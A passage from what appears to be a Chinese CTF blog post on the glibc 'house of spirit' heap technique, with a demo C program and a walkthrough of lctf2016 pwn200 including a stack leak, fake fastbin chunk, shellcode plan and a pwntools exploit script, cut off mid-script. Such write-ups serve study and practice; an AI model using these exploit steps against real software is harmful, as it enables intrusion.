class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line"><span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这个程序展现了house of spirit 攻击.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;调用malloc()函数一次，以便程序能初始化内存.\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在我们将重写一个指针，使它指向一个假的fastbin区域.\n&quot;</span>);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line"><span class="comment">// 这个和fastbinsY没什么关系 (不要被10所迷惑) - fake_chunks 仅仅是一个被分配的内存(pointed to from fastbinsY)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这个区域 (内存的长度为: %lu) 包含了两个chunk.第一个的起始地址为： %p 第二个的起始地址为： %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这个位置堆块的chunk.size需要大于16字节(存储堆块基本数据),同时要满足落在fastbin中(在64位中要小于128字节). 在释放fastbin大小的堆块时,PREV_INUSE(P标志位)会被忽视,然而IS_MMAPPED(M标志位)和NON_MAIN_ARENA(N标志位) 会造成问题.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... 注意申请堆块的时候要求,堆块大小必须四舍五入以满足malloc使用的要求. 例如: 在64位中, 0x30-0x38 将被四舍五入到0x40, 以便于他们能以malloc的参数工作到结束\n&quot;</span>);</span><br><span class="line">fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake_chunk的物理地址相邻且高的chunk其size位也是一样,size &gt; 2*SIZE_SZ (&gt;16字节,在64位系统中) &amp;&amp; size &lt; av-&gt;system_mem (&lt; 128kb 在默认的main arena中). 这是因为要通过堆块的完整性检测. 并不需要满足fastbin要求的堆块大小.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在我们指针的值修改为假的fastbin中第一个假chunk的地址, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... 注意相关的内存区域必须是16字节对齐.\n&quot;</span>);</span><br><span class="line">a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;释放重新写的指针.\n&quot;</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在下一个malloc分配将返回到伪造的堆块区域中。预期地址为: %p 实际地址为: %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>该程序先调用了<code>malloc(1)</code>开辟了一个堆块内存，初始化了一下堆块内存。如果没有<code>malloc(1)</code>在gdb动态调试的时候就会出现堆块没有初始化的提示。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114111528790.png" alt="image-20250114111528790"></p><ul><li>使用<code>malloc</code>后在栈上创建了一个多的数据，进行堆块的伪造。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114111640975.png" alt="image-20250114111640975"></p><ul><li>然后根据输出提示，设置了伪造堆块的相关数据。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114112114865.png" alt="image-20250114112114865"></p><ul><li>使用gdb进行动态调试后就会看到栈上的数据是这样分布的，并且现在<code>fast_bin</code>是空的</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114112407234.png" alt="image-20250114112407234"></p><ul><li>之后我们通过<code>free(a)</code>即<code>free(&amp;fake_chuns[1])</code>,就把伪造的堆块放入到了fastbin链中。这样就完成了<code>house of spirit</code>的利用。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114112557302.png" alt="image-20250114112557302"></p><h1 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h1><h2 id="house_of_spirit_level_1"><a class="markdownIt-Anchor" href="#house_of_spirit_level_1"></a> house_of_spirit_level_1</h2><ul><li>题目来源：lctf2016_pwn200，在buuctf上有相应的环境，附件也可以从那边下载。这边我使用patch的方法，使得我在<code>wsl</code>的环境下使用<code>glibc2.23</code>进行动态调试，这样就可以避免<code>glibc</code>版本过高的原因从而导致出现<code>tcache_bin</code>的问题</li></ul><h3 id="level_1分析1"><a class="markdownIt-Anchor" href="#level_1分析1"></a> level_1分析1</h3><ul><li>现在先使用<code>IDA</code>对该程序进行静态分析，在静态分析的时候运行程序，这样能更好的理清楚程序的运行逻辑。先<code>check</code>一下该程序的保护机制。发现保护机制开的很少。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114165252172.png" alt="image-20250114165252172"></p><ul><li>然后使用IDA对该程序进行逆向分析。先来先查看<code>main</code>函数，这里的<code>main</code>函数比较简单先是对输入输出进行初始化，然后再调用一个<code>func</code>函数。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114165353158.png" alt="image-20250114165353158"></p><ul><li>之后查看<code>func</code>函数，结合程序运行的结果看，这个函数会先输出提示<code>who are u</code>，然后逐个字节的读取用户的输入，知道遇到换行符。还会将用户输入打印出来，并且提示输入<code>id</code>，之后就是调用两个目前还不知道什么功能的函数。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114165639817.png" alt="image-20250114165639817"></p><ul><li>之后将<code>sub_4007DF</code>这个函数重新命名为<code>func2</code>，将<code>sub_400A29</code>这个函数重新命名为<code>func3</code>，再进入<code>func2</code>进行查看函数的具体操作。<ul><li>该函数先是逐个字节读取用户的输入，一共读取4个字节或者遇到换行符结束读取。</li><li>在读取的时候还会对读入<code>id</code>进行检查，检查该<code>id</code>，如果输入的<code>id</code>不在十进制的数字里面，那么就不会执行接下去的代码。</li><li>之后还会使用<code>atoi</code>函数，该函数将我们输入的<code>id</code>原本是字符的形式，将其转换为整型的形式，并返回给v2，还会将该值作为返回值返回。</li></ul></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114170226830.png" alt="image-20250114170226830"></p><ul><li>之后再来查看<code>func3</code>的函数，执行的具体功能。该函数实现以下功能：<ul><li>开辟一个<code>0x40</code>大小的堆内存，将<code>malloc</code>返回的地址给<code>dest</code>变量</li><li>输入提示字符串<code>give me money~</code>，提示我们输入<code>0x40</code>字节大小的数据，这里并不存在栈溢出</li><li>之后我们会把输入的数据原来存储在<code>buf</code>中，现在复制到<code>dest</code>这边，即复制到<code>malloc</code>开辟的堆内存这边。</li><li>最后将<code>dest</code>的值（即堆块的地址）赋值给<code>ptr</code>这个指针，注意<code>ptr</code>这个指针是存储在<code>.bss</code>段上的全局变量<strong>这个可能有用</strong></li><li>之后会调用<code>sub_4009C4</code>这个函数，将该函数命名为<code>func4</code></li></ul></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114170932308.png" alt="image-20250114170932308"></p><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114171239853.png" alt="image-20250114171239853"></p><ul><li>接下来查看<code>func4</code>函数里面的运行过程，发现该函数就是一个经典菜单的形式。<ul><li>先会调用<code>func2</code>这个功能，实现用户对选项的选择。</li><li>输入<code>1</code>的时候就调用<code>check_in</code>这个函数</li><li>输入<code>2</code>的时候就调用<code>check_out</code>这个函数</li><li>输入<code>3</code>就退出该程序</li></ul></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114174910363.png" alt="image-20250114174910363"></p><ul><li>接下来先查看<code>check_out</code>这个函数，该函数实现的功能是释放掉全局变量指针<code>ptr</code>所指向的内存地址，并将该<code>ptr</code>指针置零，从而避免<code>UAF</code>的漏洞利用。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114175227745.png" alt="image-20250114175227745"></p><ul><li>接下来查看<code>check_in</code>函数<ul><li>该函数会先检查<code>ptr</code>是已经指向一个指针，如果已经指向一个指针，那么程序就不会执行后续的语句</li><li>通过<code>func2</code>读取数字，并判断读取的数字是否在<code>0-128</code>范围内</li><li>之后使用<code>malloc</code>函数申请一个前面所读取数字大小的堆块。</li><li>最后可以向所申请的堆块写入数据。</li></ul></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114175415553.png" alt="image-20250114175415553"></p><h3 id="level_1分析2"><a class="markdownIt-Anchor" href="#level_1分析2"></a> level_1分析2</h3><ul><li>现在对该程序进行动态调试，查看该程序是否有溢出点或者其他的漏洞。</li><li>对于<code>func</code>函数这边，存在一个<code>off-by-one</code>的利用，可以通过将<code>v2</code>这个数组填满48个字节，然后就可以避免换行符，这样这边就没有<code>\x00</code>对进行截断，这时<code>printf</code>就会将<code>rbp</code>所指向的栈地址的存储的数据泄露出来，从而知道了栈的地址。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114182541113.png" alt="image-20250114182541113"></p><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114182752677.png" alt="image-20250114182752677"></p><ul><li>接下来看<code>func3</code>这个函数，这个函数在会使用<code>read</code>函数在栈上写入<code>0x40</code>个数据，但是<code>buf</code>只有<code>56</code>字节（即0x38）的栈上存储空间，这时最后的<code>0x8</code>字节就会把<code>dest</code>这个指针给覆盖掉。<ul><li>所以<code>func3</code>存在一个溢出,可以修改<code>dest</code>的值，并且之后会把<code>dest</code>赋值给<code>ptr</code>这个全局变量的指针。</li><li>在分析1中可以知道<code>free()</code>函数<code>free</code>的是<code>ptr</code>指针所指向的地址。</li></ul></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114183738698.png" alt="image-20250114183738698"></p><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114184240179.png" alt="image-20250114184240179"></p><h3 id="level_1分析3"><a class="markdownIt-Anchor" href="#level_1分析3"></a> level_1分析3</h3><ul><li>这个时候我们即泄露了栈地址，又能通过溢出修改<code>dest</code>这个指针，从而间接修改<code>ptr</code>指针。现在思路就比较明显，既然可以泄露栈地址，那么就可以利用栈伪造一个<code>fake_chunk</code>。通过<code>house-of-spirit</code>这个对利用技术，将栈上的堆放入到<code>fast_bin</code>中，在申请回来这样就可以对比较大块的栈地址进行写入。一般就可以修改返回地址。接下来要查看一下如何伪造这个堆块。栈上有什么数据可以提供我们伪造堆块。</li><li>对于<code>func()</code>函数这个输入点进行分析，发现并不能使用<code>func()</code>函数这个输入点进行堆块的伪造，这是因为在堆块的伪造过程中必然会出现<code>\x00</code>这个截断操作。这就导致我们在使用<code>printf</code>函数进行格式化输出的时候栈上的地址泄露不出来。</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114220704878.png" alt="image-20250114220704878"></p><ul><li>对于<code>func2</code>可写入栈上的数据有限，也没办法完成对堆块的伪造，所以先来分析一下<code>func3</code>是否能在修改指针的时候对堆块进行伪造，发现这是可以行的，这时我们在栈上进行堆块的伪造，并不会影响我们<code>ptr</code>指针的修改</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114221209554.png" alt="image-20250114221209554"></p><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114221408995.png" alt="image-20250114221408995"></p><ul><li>所以我们选择该此处对堆块的伪造，然后我们再来分析一下栈上高地址处是否可以有<code>0x10</code>整数倍的，并且小于<code>128kb</code>大小的，还要满足<code>prev_size</code>的最低位为<code>0xXXXX0</code>这样我们就可以伪造出<code>fake_chunk</code>并且成功的把堆块给链到<code>fastbin</code>上。<ul><li>查看栈后发现这个地方明显是可以被控制的，而控制这个栈数据的也就只能是<code>func</code>或者<code>func2</code>的执行过程。</li><li>我们发现这个数据是存储在<code>func</code>函数输入的更低地址，所以应该是在<code>func</code>这个函数控制的。</li></ul></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114221702499.png" alt="image-20250114221702499"></p><ul><li>我们查看<code>func</code>的变量时，发现逐字节输入，控制循环的变量<code>i</code>最终的结果为<code>0x30</code>（存储位置是位于更低地址的栈那边），但是这个<code>0x30</code>我们希望用来伪造<code>size</code>，可是这个栈地址是<code>0xXXXXX0</code>开始的，这并不能满足堆块内存对齐的问题</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114222006046.png" alt="image-20250114222006046"></p><ul><li>这时还有一个<code>0x30</code>是怎么来的，对于反编译的代码是没有体现出来的。我们需要去看<code>func</code>的汇编代码，这时我们发现调用完<code>func2</code>后，存储返回值的寄存器<code>rax</code>会有一个操作，也就是将<code>func2</code>的返回值复制到栈上。</li><li>而<code>func2</code>返回的也就是我们输入数字对应的整数。所以我们要伪造该堆块，在<code>func</code>调用<code>func2</code>时，就要像这边输入<code>48</code>即0x30（或者其他符合要求的数据。）</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114222208178.png" alt="image-20250114222208178"></p><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114222419703.png" alt="image-20250114222419703"></p><ul><li>这样我们就满足了伪造堆块的条件，现在我们要通过栈地址计算我们所申请堆块的<code>size</code>大小，和我们要伪造堆块的<code>size</code></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114223004747.png" alt="image-20250114223004747"></p><ul><li>还有我们要修改的指针是指向<code>0x7ffcddf7d710</code>，但是我们泄露的指针是泄露到更高地址。所以我们还要计算偏移，所以我们最后会将指针修改为<code>leak_addr-0x110+0x60</code></li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114223326367.png" alt="image-20250114223326367"></p><ul><li>通过伪造堆块我们就可以释放该堆块，将该堆块放到<code>fast_bin</code>链上，这时编写部分<code>exp</code>进行动态调试查看<code>fake_chunk</code>是否被添加到<code>fast_bin</code>链表上</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(b&#x27;node5.buuoj.cn&#x27;,25055)</span></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x400996&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaa&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">b&#x27;who are u?\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;faaaaaaa&#x27;</span>)</span><br><span class="line">stack_addr = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(stack_addr)</span><br><span class="line">stack_addr=stack_addr[:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_addr-------&gt;&#x27;</span>,stack_addr)</span><br><span class="line">stack_addr=<span class="built_in">int</span>.from_bytes(stack_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">ptr = stack_addr-<span class="number">0xf0</span>+<span class="number">0x40</span></span><br><span class="line">payload1 = <span class="string">b&#x27;48&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;give me your id ~~?\n&#x27;</span>,payload1)</span><br><span class="line"><span class="comment"># payload2构造fake_chunk</span></span><br><span class="line">payload2 = p64(<span class="number">0x0</span>)+p64(<span class="number">0x61</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(ptr)</span><br><span class="line"><span class="comment">#payload2 = b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaa&#x27;#aaaahaaaaaaa&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;give me money~\n&#x27;</span>,payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;2&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice :&#x27;</span>,payload3)</span><br></pre></td></tr></table></figure><ul><li>这时我们就发现我们伪造的<code>fake_chunk</code>被加到了<code>fastbin</code>上</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114223958254.png" alt="image-20250114223958254"></p><ul><li>这时我们再使用<code>malloc</code>申请回来，我们就可以对该栈进行写，并且还可以修改返回地址。之前在查看保护机制时，有注意到栈是具有可执行权限的，所以我们就向我们申请的堆块写入<code>shellcode</code>，并修改返回地址到栈上我们写入<code>shellcode</code>的开头。这样就可以<code>getshell</code>了</li></ul><p><img src="/2025/01/13/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-sprirt/image-20250114224708763.png" alt="image-20250114224708763"></p><h3 id="level_1_exp"><a class="markdownIt-Anchor" href="#level_1_exp"></a> level_1_exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span 